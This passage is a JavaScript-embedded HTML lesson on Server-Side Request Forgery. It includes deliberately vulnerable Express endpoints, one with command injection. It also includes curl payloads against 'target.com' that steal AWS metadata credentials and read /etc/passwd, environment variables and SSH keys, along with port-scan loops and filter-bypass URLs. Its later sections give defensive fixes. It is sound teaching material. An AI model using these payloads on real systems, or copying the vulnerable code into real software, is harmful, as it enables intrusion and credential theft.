window.LESSONS = window.LESSONS || {};
window.LESSONS.ssrf = `

<h1 class="lesson-title">Lab 17: Server-Side Request Forgery (SSRF)</h1>

<p class="lesson-subtitle">
  You are going to learn how Server-Side Request Forgery turns your backend into an unwitting proxy for
  attackers. SSRF is deceptively simple: you trick the server into making HTTP requests on your behalf,
  reaching internal services, cloud metadata endpoints, and local files that are invisible from the
  outside. It earned its own spot in the OWASP Top 10 (2021, A10) because cloud environments turned
  what was once a low-impact bug into a path to full infrastructure compromise.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> What SSRF Actually Is</h2>

<p>
  Server-Side Request Forgery happens whenever your application takes a URL from user input and fetches
  it on the server side. This pattern appears everywhere: webhook delivery, URL preview generators,
  PDF renderers, image proxy endpoints, link validators, and API integrations that fetch remote
  resources. The moment your server reaches out to a URL that a user controls, you have a potential
  SSRF vector.
</p>

<p>
  The danger comes from the server's network position. Your application server sits behind firewalls,
  inside VPCs, on private subnets. It can reach internal services that are completely invisible to the
  outside internet: admin panels on localhost, database management consoles, cloud metadata endpoints,
  internal APIs, and infrastructure services. An attacker sitting outside your network cannot reach
  any of these. But if they can make your server fetch a URL of their choosing, <em>your server</em>
  makes the request from its privileged network position, and the response comes back to the attacker.
</p>

<p>
  Think of it this way: SSRF turns your application server into an open proxy that an attacker can aim
  at your internal network. The server trusts its own requests — after all, they come from localhost or
  the internal subnet — so internal services happily respond with sensitive data, admin interfaces,
  and cloud credentials.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Vulnerable URL Fetcher Endpoint</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> express <span class="op">=</span> <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> axios <span class="op">=</span> <span class="fn">require</span>(<span class="str">'axios'</span>);
<span class="kw">const</span> app <span class="op">=</span> <span class="fn">express</span>();

<span class="cmt">// "URL Preview" feature — fetches a URL and returns metadata</span>
<span class="cmt">// This is the classic SSRF entry point</span>
app.<span class="fn">get</span>(<span class="str">'/api/preview'</span>, <span class="kw">async</span> (req, res) <span class="op">=></span> {
  <span class="kw">const</span> { url } <span class="op">=</span> req.query;

  <span class="kw">if</span> (!url) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({ error: <span class="str">'URL required'</span> });
  }

  <span class="kw">try</span> {
    <span class="cmt">// VULNERABLE: Fetches whatever URL the user provides</span>
    <span class="cmt">// No validation on the target host or protocol</span>
    <span class="kw">const</span> response <span class="op">=</span> <span class="kw">await</span> axios.<span class="fn">get</span>(url);
    res.<span class="fn">json</span>({
      status: response.status,
      headers: response.headers,
      body: response.data
    });
  } <span class="kw">catch</span> (err) {
    res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({ error: err.message });
  }
});

<span class="cmt">// Internal admin panel — only accessible from localhost</span>
app.<span class="fn">get</span>(<span class="str">'/internal/admin'</span>, (req, res) <span class="op">=></span> {
  <span class="kw">const</span> ip <span class="op">=</span> req.connection.remoteAddress;
  <span class="kw">if</span> (ip <span class="op">===</span> <span class="str">'127.0.0.1'</span> <span class="op">||</span> ip <span class="op">===</span> <span class="str">'::1'</span>) {
    res.<span class="fn">json</span>({
      users: [<span class="str">'admin'</span>, <span class="str">'root'</span>],
      dbPassword: <span class="str">'super_secret_db_pass'</span>,
      apiKeys: { stripe: <span class="str">'sk_live_...'</span>, aws: <span class="str">'AKIA...'</span> }
    });
  } <span class="kw">else</span> {
    res.<span class="fn">status</span>(<span class="num">403</span>).<span class="fn">json</span>({ error: <span class="str">'Forbidden'</span> });
  }
});

app.<span class="fn">listen</span>(<span class="num">3000</span>);</pre>
</div>

<p>
  Look at this code carefully. The <code>/api/preview</code> endpoint takes a URL from the query
  string and fetches it with axios. There is zero validation on what URL is provided. The
  <code>/internal/admin</code> endpoint checks that requests come from localhost — a common pattern
  for internal-only endpoints. The developer assumed that if the request comes from 127.0.0.1, it
  must be legitimate. But SSRF breaks that assumption entirely.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> Scenario 1 — Accessing Internal Services</h2>

<p>
  The most straightforward SSRF attack accesses internal services that trust requests from localhost
  or the internal network. In our vulnerable application, the <code>/internal/admin</code> endpoint
  rejects external requests but trusts anything from 127.0.0.1. The attacker cannot reach this
  endpoint directly, but they can make the server reach it for them.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Accessing the Internal Admin Panel</div>
  <pre>
# Direct request — blocked (403 Forbidden)
curl http://target.com/internal/admin
# → {"error":"Forbidden"}

# SSRF — server fetches from localhost on our behalf
curl "http://target.com/api/preview?url=http://localhost:3000/internal/admin"
# → {"users":["admin","root"],"dbPassword":"super_secret_db_pass","apiKeys":{...}}

# Try other internal services on the same machine
curl "http://target.com/api/preview?url=http://localhost:6379/INFO"
# → Redis server information (if Redis is running unprotected)

curl "http://target.com/api/preview?url=http://localhost:9200/_cluster/health"
# → Elasticsearch cluster status

curl "http://target.com/api/preview?url=http://localhost:27017/"
# → MongoDB connection response

# Scan the internal network
curl "http://target.com/api/preview?url=http://10.0.0.1:8080/"
curl "http://target.com/api/preview?url=http://192.168.1.100:3000/"
curl "http://target.com/api/preview?url=http://172.16.0.5:8443/"</pre>
</div>

<p>
  The attacker just extracted the database password, API keys, and user list from an admin panel that
  was supposedly "internal only." They can also use the SSRF as a port scanner, probing internal IPs
  and ports to map the internal network. Different error messages reveal whether a port is open
  (connection refused vs. timeout vs. response), giving the attacker a map of your internal
  infrastructure without ever touching your network directly.
</p>

<div class="callout warn">
  <div class="callout-title">localhost Is Not a Security Boundary</div>
  <div class="callout-text">
    Many internal tools — Redis, Elasticsearch, Memcached, database admin panels, monitoring
    dashboards — are configured to listen on localhost or 0.0.0.0 with no authentication, under the
    assumption that only trusted processes on the same machine will access them. SSRF turns every one
    of these into an externally accessible service. If your internal services rely on network
    position for security, SSRF negates that entirely.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> Scenario 2 — Cloud Metadata Exfiltration</h2>

<p>
  This is the attack that made SSRF famous and earned it a place in the OWASP Top 10. Every major
  cloud provider exposes an instance metadata service at a well-known internal IP address:
  <code>169.254.169.254</code>. This link-local address is only reachable from within the instance
  itself — you cannot access it from the internet. But the application server running inside the
  cloud instance <em>can</em> reach it, which means SSRF gives the attacker access to it.
</p>

<p>
  The metadata service contains everything: the instance's IAM role credentials (temporary AWS access
  keys), network configuration, user data scripts (which often contain secrets), and instance
  identity documents. A single SSRF request to the metadata endpoint can give an attacker full AWS
  API access with whatever permissions the instance's IAM role has.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: AWS Metadata — Stealing IAM Credentials</div>
  <pre>
# Step 1: Discover the IAM role name
curl "http://target.com/api/preview?url=\
http://169.254.169.254/latest/meta-data/iam/\
security-credentials/"
# → "my-app-role"

# Step 2: Retrieve temporary credentials for that role
curl "http://target.com/api/preview?url=\
http://169.254.169.254/latest/meta-data/iam/\
security-credentials/my-app-role"
# → {
#     "AccessKeyId": "ASIAXXXXXXXXXXX",
#     "SecretAccessKey": "wJalrXUtnFEMI/...",
#     "Token": "FwoGZXIvYXdzE...",
#     "Expiration": "2026-03-18T18:00:00Z"
#   }

# Step 3: Use stolen credentials from your own machine
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/..."
export AWS_SESSION_TOKEN="FwoGZXIvYXdzE..."

# Now you have the same permissions as the EC2 instance
aws s3 ls                    # List all S3 buckets
aws dynamodb list-tables     # List DynamoDB tables
aws secretsmanager list-secrets  # List secrets
aws iam list-users           # Enumerate IAM users</pre>
</div>

<p>
  This is the attack that compromised Capital One in 2019, resulting in the exposure of over 100
  million customer records. A misconfigured WAF allowed SSRF requests to the EC2 metadata service.
  The attacker obtained temporary IAM credentials and used them to access S3 buckets containing
  sensitive customer data. The entire attack chain — from SSRF to data exfiltration — exploited
  the trust between the EC2 instance and the metadata service.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Other Cloud Metadata Endpoints</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// AWS EC2 (IMDSv1 — vulnerable, no authentication)</span>
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

<span class="cmt">// Google Cloud (requires Metadata-Flavor header)</span>
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

<span class="cmt">// Azure (requires Metadata: true header)</span>
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token

<span class="cmt">// DigitalOcean</span>
http://169.254.169.254/metadata/v1/

<span class="cmt">// Kubernetes service account token</span>
file:///var/run/secrets/kubernetes.io/serviceaccount/token</pre>
</div>

<div class="callout info">
  <div class="callout-title">IMDSv2 — AWS's SSRF Mitigation</div>
  <div class="callout-text">
    AWS introduced Instance Metadata Service v2 (IMDSv2) specifically to mitigate SSRF attacks.
    IMDSv2 requires a two-step process: first, a PUT request to obtain a session token, then the
    token must be included as a header in subsequent metadata requests. Since most SSRF vectors only
    allow GET requests and cannot set custom headers, IMDSv2 blocks the majority of SSRF metadata
    attacks. <strong>Always enforce IMDSv2</strong> on your EC2 instances and disable IMDSv1. Google
    Cloud and Azure have similar header-based protections, but they must be correctly configured.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> Scenario 3 — File Protocol Abuse</h2>

<p>
  SSRF is not limited to HTTP. If the URL-fetching library supports other protocols, the attacker
  can read local files from the server's filesystem. The <code>file://</code> protocol is the most
  common vector, but <code>gopher://</code>, <code>dict://</code>, and <code>ftp://</code> have
  all been used in SSRF exploits. Libraries like <code>axios</code> in Node.js do not support
  <code>file://</code> by default, but other libraries and languages do. Let me show you what this
  looks like with a vulnerable endpoint that uses a library supporting file URIs.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Vulnerable Endpoint Using node-fetch or Custom Fetcher</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> { execSync } <span class="op">=</span> <span class="fn">require</span>(<span class="str">'child_process'</span>);

<span class="cmt">// Vulnerable: uses curl under the hood, which supports file://</span>
app.<span class="fn">get</span>(<span class="str">'/api/fetch-url'</span>, (req, res) <span class="op">=></span> {
  <span class="kw">const</span> { url } <span class="op">=</span> req.query;

  <span class="kw">try</span> {
    <span class="cmt">// Using curl as a fetcher — supports file://, gopher://, dict://</span>
    <span class="kw">const</span> result <span class="op">=</span> <span class="fn">execSync</span>(
      <span class="str">\`curl -s -L "\${url}"\`</span>,
      { encoding: <span class="str">'utf8'</span>, timeout: <span class="num">5000</span> }
    );
    res.<span class="fn">json</span>({ content: result });
  } <span class="kw">catch</span> (err) {
    res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({ error: err.message });
  }
});</pre>
</div>

<div class="attack-box">
  <div class="attack-title">Attack: Reading Local Files via file:// Protocol</div>
  <pre>
# Read /etc/passwd — list of system users
curl "http://target.com/api/fetch-url?url=file:///etc/passwd"
# → root:x:0:0:root:/root:/bin/bash
#   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
#   node:x:1000:1000::/home/node:/bin/bash

# Read environment variables — often contain secrets
curl "http://target.com/api/fetch-url?url=file:///proc/self/environ"
# → DATABASE_URL=postgres://admin:password@db:5432/app
#   JWT_SECRET=my-super-secret-key
#   AWS_ACCESS_KEY_ID=AKIAXXXXXXXX
#   STRIPE_SECRET_KEY=sk_live_XXXX

# Read the application source code
curl "http://target.com/api/fetch-url?url=file:///app/server.js"
curl "http://target.com/api/fetch-url?url=file:///app/.env"
curl "http://target.com/api/fetch-url?url=file:///app/package.json"

# Read SSH keys
curl "http://target.com/api/fetch-url?url=file:///home/node/.ssh/id_rsa"

# Read Kubernetes secrets
curl "http://target.com/api/fetch-url?url=\
file:///var/run/secrets/kubernetes.io/serviceaccount/token"</pre>
</div>

<p>
  Note that this endpoint also has a command injection vulnerability (it passes user input to
  <code>execSync</code> with a template literal). That is intentional — in real applications,
  vulnerabilities cluster. A developer who does not validate URLs probably does not sanitize
  shell inputs either. But even without the command injection, the file protocol abuse alone
  gives the attacker access to secrets, source code, SSH keys, and Kubernetes service account
  tokens.
</p>

<div class="callout warn">
  <div class="callout-title">Protocol Support Varies by Library</div>
  <div class="callout-text">
    <strong>axios</strong> (Node.js) — HTTP/HTTPS only. Does not support file://. Relatively safe
    from protocol-based SSRF, but still vulnerable to HTTP-based SSRF against internal services.<br>
    <strong>node-fetch</strong> — HTTP/HTTPS only. Same limitations as axios.<br>
    <strong>curl</strong> (via child_process) — Supports file://, gopher://, dict://, ftp://, and
    more. Extremely dangerous when used as a URL fetcher.<br>
    <strong>Python requests</strong> — HTTP/HTTPS only, but Python's <code>urllib</code> supports
    file://.<br>
    <strong>Java HttpURLConnection</strong> — Supports file://, jar://, and other protocols.<br>
    Always check what protocols your HTTP client library supports. Even if the primary library is
    safe, a fallback or alternative path might use a more permissive client.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 5</span> Scenario 4 — Blind SSRF with Out-of-Band Detection</h2>

<p>
  Not every SSRF returns the response body to the attacker. Many SSRF vectors are "blind" — the
  server fetches the URL, but the response is processed internally, stored in a database, or
  simply discarded. The attacker does not see the response content. But blind SSRF is still
  dangerous. The attacker can confirm that the server made the request by watching for it to
  arrive at a server they control.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Blind SSRF — Webhook Registration Endpoint</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// User registers a webhook URL — server validates by sending a test request</span>
app.<span class="fn">post</span>(<span class="str">'/api/webhooks'</span>, <span class="kw">async</span> (req, res) <span class="op">=></span> {
  <span class="kw">const</span> { callbackUrl } <span class="op">=</span> req.body;

  <span class="kw">try</span> {
    <span class="cmt">// VULNERABLE: Server fetches the URL to verify it is reachable</span>
    <span class="cmt">// Response is not returned to the user — blind SSRF</span>
    <span class="kw">await</span> axios.<span class="fn">get</span>(callbackUrl, { timeout: <span class="num">5000</span> });

    <span class="cmt">// Store the webhook (attacker doesn't see the fetch response)</span>
    <span class="kw">await</span> db.<span class="fn">webhooks</span>.<span class="fn">insert</span>({ url: callbackUrl });
    res.<span class="fn">json</span>({ success: <span class="kw">true</span>, message: <span class="str">'Webhook registered'</span> });
  } <span class="kw">catch</span> (err) {
    res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({ error: <span class="str">'URL not reachable'</span> });
  }
});</pre>
</div>

<div class="attack-box">
  <div class="attack-title">Attack: Blind SSRF — Out-of-Band Detection</div>
  <pre>
# Step 1: Set up a listener on your server
# (using Burp Collaborator, interactsh, or a simple HTTP server)
python3 -m http.server 8888 --bind 0.0.0.0

# Step 2: Trigger SSRF pointing to your server
curl -X POST http://target.com/api/webhooks \
  -H "Content-Type: application/json" \
  -d '{"callbackUrl": "http://YOUR-SERVER:8888/ssrf-test"}'

# Step 3: Check your server logs
# If you see an incoming request from the target's IP,
# SSRF is confirmed — the server made the request

# Step 4: Use blind SSRF to scan internal ports
# Different error responses reveal port status:
# - "URL not reachable" with quick response = port closed (connection refused)
# - "URL not reachable" with slow response = port filtered (timeout)
# - "Webhook registered" = port open (got a response)

for port in 22 80 443 3000 3306 5432 6379 8080 9200 27017; do
  echo -n "Port $port: "
  curl -s -o /dev/null -w "%{http_code} %{time_total}s" \
    -X POST http://target.com/api/webhooks \
    -H "Content-Type: application/json" \
    -d "{\"callbackUrl\": \"http://10.0.0.5:$port/\"}"
  echo
done</pre>
</div>

<p>
  Even though the attacker never sees the response from internal services, they gain valuable
  intelligence: which internal IPs exist, which ports are open, and which services are running.
  They can also use blind SSRF to trigger actions on internal services — sending data to a Redis
  instance, hitting an internal API endpoint that performs actions, or triggering deployments on
  CI/CD systems. The response does not matter if the request itself causes a side effect.
</p>

<div class="callout info">
  <div class="callout-title">Tools for Blind SSRF Detection</div>
  <div class="callout-text">
    <strong>Burp Collaborator</strong> — Generates unique URLs and monitors for incoming DNS lookups
    and HTTP requests. Part of Burp Suite Professional.<br>
    <strong>interactsh</strong> — Open-source alternative to Burp Collaborator. Run your own
    out-of-band interaction server.<br>
    <strong>webhook.site</strong> — Free online service that provides a unique URL and logs all
    incoming requests. Useful for quick testing.<br>
    <strong>ngrok</strong> — Tunnels requests to your local machine. Useful for receiving SSRF
    callbacks when you do not have a public server.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 6</span> Bypassing Common SSRF Filters</h2>

<p>
  When developers become aware of SSRF, they often implement naive filters that are trivially
  bypassed. Understanding these bypasses is essential for building defenses that actually work.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Naive SSRF Filter (Easily Bypassed)</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
app.<span class="fn">get</span>(<span class="str">'/api/preview'</span>, <span class="kw">async</span> (req, res) <span class="op">=></span> {
  <span class="kw">const</span> { url } <span class="op">=</span> req.query;

  <span class="cmt">// Naive filter: block "localhost" and "127.0.0.1"</span>
  <span class="kw">if</span> (url.<span class="fn">includes</span>(<span class="str">'localhost'</span>) <span class="op">||</span> url.<span class="fn">includes</span>(<span class="str">'127.0.0.1'</span>)) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">403</span>).<span class="fn">json</span>({ error: <span class="str">'Blocked'</span> });
  }

  <span class="cmt">// Passes filter, but still vulnerable to many bypasses</span>
  <span class="kw">const</span> response <span class="op">=</span> <span class="kw">await</span> axios.<span class="fn">get</span>(url);
  res.<span class="fn">json</span>({ data: response.data });
});</pre>
</div>

<div class="attack-box">
  <div class="attack-title">Attack: SSRF Filter Bypasses</div>
  <pre>
# === IP Address Representations ===

# Decimal encoding of 127.0.0.1
http://2130706433/internal/admin

# Hex encoding
http://0x7f000001/internal/admin

# Octal encoding
http://0177.0000.0000.0001/internal/admin

# IPv6 loopback
http://[::1]/internal/admin

# IPv6-mapped IPv4
http://[::ffff:127.0.0.1]/internal/admin

# Short form — 127.1 resolves to 127.0.0.1 on most systems
http://127.1/internal/admin

# Zero — 0.0.0.0 often resolves to localhost
http://0.0.0.0/internal/admin
http://0/internal/admin

# === DNS-Based Bypasses ===

# Register a domain that resolves to 127.0.0.1
# Many free DNS services allow this
http://localtest.me/internal/admin
http://spoofed.burpcollaborator.net/internal/admin
http://your-domain-pointing-to-127.0.0.1.com/internal/admin

# === URL Parsing Tricks ===

# URL with credentials (user@host)
http://evil.com@127.0.0.1/internal/admin

# URL encoding
http://127.0.0.%31/internal/admin

# Double URL encoding
http://127.0.0.%2531/internal/admin

# === Redirect-Based Bypasses ===

# Host a page that redirects to the internal target
# Filter checks the initial URL, but follows the redirect
http://your-server.com/redirect?to=http://127.0.0.1/internal/admin

# === Cloud Metadata Specific ===

# Alternative IPs for the metadata service
http://[::ffff:169.254.169.254]/
http://169.254.169.254.xip.io/
http://2852039166/  # decimal encoding</pre>
</div>

<p>
  The lesson here is clear: <strong>blocklist-based SSRF protection does not work</strong>. There
  are too many representations of the same IP address, too many DNS tricks, and too many redirect
  chains to block them all. Any string-matching filter on the URL will miss at least one encoding.
  The only reliable approach is an allowlist combined with DNS resolution validation — which we
  will build in the fix section.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 7</span> Fix — Proper SSRF Prevention</h2>

<p>
  SSRF defense requires multiple layers. No single check is sufficient because attackers combine
  DNS tricks, redirects, and encoding to bypass individual controls. Here is the comprehensive
  defense.
</p>

<div class="fix-box">
  <div class="fix-title">Fix: Complete SSRF Prevention Middleware</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">ssrf-protection.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> { URL } <span class="op">=</span> <span class="fn">require</span>(<span class="str">'url'</span>);
<span class="kw">const</span> dns <span class="op">=</span> <span class="fn">require</span>(<span class="str">'dns'</span>);
<span class="kw">const</span> { promisify } <span class="op">=</span> <span class="fn">require</span>(<span class="str">'util'</span>);
<span class="kw">const</span> resolve4 <span class="op">=</span> <span class="fn">promisify</span>(dns.resolve4);
<span class="kw">const</span> ipaddr <span class="op">=</span> <span class="fn">require</span>(<span class="str">'ipaddr.js'</span>); <span class="cmt">// npm install ipaddr.js</span>

<span class="cmt">// Step 1: PROTOCOL ALLOWLIST — only http and https</span>
<span class="kw">const</span> ALLOWED_PROTOCOLS <span class="op">=</span> <span class="kw">new</span> <span class="fn">Set</span>([<span class="str">'http:'</span>, <span class="str">'https:'</span>]);

<span class="cmt">// Step 2: DOMAIN ALLOWLIST (if applicable)</span>
<span class="cmt">// For webhook validation, only allow known services</span>
<span class="kw">const</span> ALLOWED_DOMAINS <span class="op">=</span> <span class="kw">new</span> <span class="fn">Set</span>([
  <span class="str">'api.github.com'</span>,
  <span class="str">'hooks.slack.com'</span>,
  <span class="str">'api.stripe.com'</span>,
]);

<span class="cmt">// Step 3: Check if an IP is private/internal</span>
<span class="kw">function</span> <span class="fn">isPrivateIP</span>(ip) {
  <span class="kw">try</span> {
    <span class="kw">const</span> addr <span class="op">=</span> ipaddr.<span class="fn">parse</span>(ip);
    <span class="kw">const</span> range <span class="op">=</span> addr.<span class="fn">range</span>();
    <span class="cmt">// Block all non-unicast ranges</span>
    <span class="kw">const</span> blocked <span class="op">=</span> [
      <span class="str">'loopback'</span>,       <span class="cmt">// 127.0.0.0/8, ::1</span>
      <span class="str">'private'</span>,        <span class="cmt">// 10.x, 172.16-31.x, 192.168.x</span>
      <span class="str">'linkLocal'</span>,      <span class="cmt">// 169.254.x.x (metadata!)</span>
      <span class="str">'uniqueLocal'</span>,    <span class="cmt">// fc00::/7</span>
      <span class="str">'unspecified'</span>,    <span class="cmt">// 0.0.0.0, ::</span>
      <span class="str">'broadcastNotation'</span>,
      <span class="str">'multicast'</span>,
    ];
    <span class="kw">return</span> blocked.<span class="fn">includes</span>(range);
  } <span class="kw">catch</span> {
    <span class="kw">return</span> <span class="kw">true</span>; <span class="cmt">// If we can't parse it, block it</span>
  }
}

<span class="cmt">// Step 4: Validate URL before fetching</span>
<span class="kw">async function</span> <span class="fn">validateURL</span>(userUrl) {
  <span class="cmt">// Parse the URL — rejects malformed URLs</span>
  <span class="kw">let</span> parsed;
  <span class="kw">try</span> {
    parsed <span class="op">=</span> <span class="kw">new</span> <span class="fn">URL</span>(userUrl);
  } <span class="kw">catch</span> {
    <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">'Invalid URL'</span>);
  }

  <span class="cmt">// Check protocol</span>
  <span class="kw">if</span> (!ALLOWED_PROTOCOLS.<span class="fn">has</span>(parsed.protocol)) {
    <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">\`Protocol \${parsed.protocol} not allowed\`</span>);
  }

  <span class="cmt">// Check domain allowlist (if using one)</span>
  <span class="cmt">// if (!ALLOWED_DOMAINS.has(parsed.hostname)) {</span>
  <span class="cmt">//   throw new Error('Domain not in allowlist');</span>
  <span class="cmt">// }</span>

  <span class="cmt">// Resolve DNS BEFORE making the request</span>
  <span class="cmt">// This prevents DNS rebinding and redirect tricks</span>
  <span class="kw">let</span> addresses;
  <span class="kw">try</span> {
    addresses <span class="op">=</span> <span class="kw">await</span> <span class="fn">resolve4</span>(parsed.hostname);
  } <span class="kw">catch</span> {
    <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">'Could not resolve hostname'</span>);
  }

  <span class="cmt">// Check EVERY resolved IP — domains can have multiple A records</span>
  <span class="kw">for</span> (<span class="kw">const</span> ip <span class="kw">of</span> addresses) {
    <span class="kw">if</span> (<span class="fn">isPrivateIP</span>(ip)) {
      <span class="kw">throw new</span> <span class="fn">Error</span>(
        <span class="str">\`Resolved to private IP: \${ip}\`</span>
      );
    }
  }

  <span class="kw">return</span> parsed;
}

<span class="cmt">// Step 5: Use it in the endpoint</span>
app.<span class="fn">get</span>(<span class="str">'/api/preview'</span>, <span class="kw">async</span> (req, res) <span class="op">=></span> {
  <span class="kw">try</span> {
    <span class="kw">const</span> validated <span class="op">=</span> <span class="kw">await</span> <span class="fn">validateURL</span>(req.query.url);

    <span class="kw">const</span> response <span class="op">=</span> <span class="kw">await</span> axios.<span class="fn">get</span>(validated.href, {
      timeout: <span class="num">5000</span>,
      maxRedirects: <span class="num">0</span>,        <span class="cmt">// CRITICAL: disable redirects</span>
      validateStatus: <span class="kw">null</span>,   <span class="cmt">// Accept any status</span>
    });

    res.<span class="fn">json</span>({
      status: response.status,
      contentType: response.headers[<span class="str">'content-type'</span>],
      body: <span class="kw">typeof</span> response.data <span class="op">===</span> <span class="str">'string'</span>
        ? response.data.<span class="fn">substring</span>(<span class="num">0</span>, <span class="num">10000</span>)
        : response.data,
    });
  } <span class="kw">catch</span> (err) {
    res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({ error: err.message });
  }
});</pre>
</div>
</div>

<p>
  Let me explain every layer of this defense:
</p>

<ul>
  <li><strong>Protocol allowlist.</strong> Only <code>http:</code> and <code>https:</code> are
  permitted. This blocks <code>file://</code>, <code>gopher://</code>, <code>dict://</code>,
  and every other protocol abuse.</li>
  <li><strong>DNS resolution before request.</strong> We resolve the hostname to IP addresses
  <em>before</em> making the HTTP request. This catches domains that resolve to private IPs,
  including attacker-controlled DNS that points to 127.0.0.1.</li>
  <li><strong>Private IP detection.</strong> Using the <code>ipaddr.js</code> library, we check
  every resolved IP against all private, loopback, link-local (169.254.x.x — the metadata
  range!), and special ranges. If any resolved IP is internal, the request is blocked.</li>
  <li><strong>Redirect disabled.</strong> Setting <code>maxRedirects: 0</code> prevents the
  attacker from using an external URL that redirects to an internal one. Without this, the
  attacker's domain passes the DNS check, but the redirect target hits localhost.</li>
  <li><strong>Response truncation.</strong> Limiting response body size prevents the attacker
  from exfiltrating large amounts of data through the SSRF endpoint.</li>
</ul>

<div class="fix-box">
  <div class="fix-title">Fix: Using ssrf-req-filter (Drop-In Library)</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Quick SSRF Protection with ssrf-req-filter</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// npm install ssrf-req-filter</span>
<span class="kw">const</span> ssrfFilter <span class="op">=</span> <span class="fn">require</span>(<span class="str">'ssrf-req-filter'</span>);
<span class="kw">const</span> axios <span class="op">=</span> <span class="fn">require</span>(<span class="str">'axios'</span>);

app.<span class="fn">get</span>(<span class="str">'/api/preview'</span>, <span class="kw">async</span> (req, res) <span class="op">=></span> {
  <span class="kw">try</span> {
    <span class="cmt">// ssrf-req-filter provides a custom HTTP agent</span>
    <span class="cmt">// that blocks requests to private/internal IPs</span>
    <span class="kw">const</span> response <span class="op">=</span> <span class="kw">await</span> axios.<span class="fn">get</span>(req.query.url, {
      httpAgent: <span class="fn">ssrfFilter</span>(req.query.url),
      timeout: <span class="num">5000</span>,
      maxRedirects: <span class="num">0</span>,
    });
    res.<span class="fn">json</span>({ data: response.data });
  } <span class="kw">catch</span> (err) {
    res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({ error: <span class="str">'Request blocked'</span> });
  }
});</pre>
</div>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Infrastructure-Level Defenses</div>
  <p>
    Application-level validation is essential, but infrastructure defenses provide defense in depth:
  </p>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Infrastructure Hardening</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="cmt"># 1. Enforce IMDSv2 on all EC2 instances</span>
aws ec2 modify-instance-metadata-options \\
  --instance-id i-1234567890abcdef \\
  --http-tokens required \\
  --http-endpoint enabled

<span class="cmt"># 2. Network segmentation — firewall rules</span>
<span class="cmt"># Block application servers from reaching metadata</span>
iptables -A OUTPUT -d 169.254.169.254 -j DROP

<span class="cmt"># 3. Use VPC security groups to limit egress</span>
<span class="cmt"># Only allow outbound to known external services</span>
<span class="cmt"># Block outbound to RFC 1918 ranges from web tier</span>

<span class="cmt"># 4. Use an HTTP proxy for all outbound requests</span>
<span class="cmt"># Route through a forward proxy that enforces policies</span>
<span class="cmt"># The proxy can block requests to internal ranges</span>

<span class="cmt"># 5. Least privilege IAM roles</span>
<span class="cmt"># Even if metadata is accessed, minimize the damage</span>
<span class="cmt"># Never attach admin or broad permissions to app servers</span></pre>
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Deeper</span> SSRF in Real-World Node.js Patterns</h2>

<p>
  SSRF does not always come from an obvious "fetch this URL" endpoint. In Node.js applications,
  SSRF vectors hide in many common patterns:
</p>

<h3>Webhook Delivery</h3>
<p>
  Any system that sends webhooks — payment processors, CI/CD pipelines, monitoring tools — has a
  potential SSRF vector. The user provides a callback URL, and the server fetches it. Even if
  you validate at registration time, what if the DNS record changes between validation and
  delivery? This is DNS rebinding: the domain resolves to a public IP during validation, then
  switches to 127.0.0.1 when the webhook is actually delivered.
</p>

<h3>URL Preview / Link Unfurling</h3>
<p>
  Chat applications, social networks, and content management systems that fetch URL metadata
  (title, description, image) for previews are classic SSRF targets. Slack, Discord, and
  Microsoft Teams all had to build extensive SSRF protections into their link unfurling features.
</p>

<h3>PDF Generation</h3>
<p>
  Libraries like Puppeteer, wkhtmltopdf, and PhantomJS that render HTML to PDF will fetch
  external resources referenced in the HTML — images, stylesheets, fonts. If the HTML content
  is user-controlled, an attacker can include <code>&lt;img src="http://169.254.169.254/..."&gt;</code>
  and the PDF renderer will fetch it.
</p>

<h3>Image Processing</h3>
<p>
  Endpoints that accept a URL to an image for resizing, cropping, or format conversion. The server
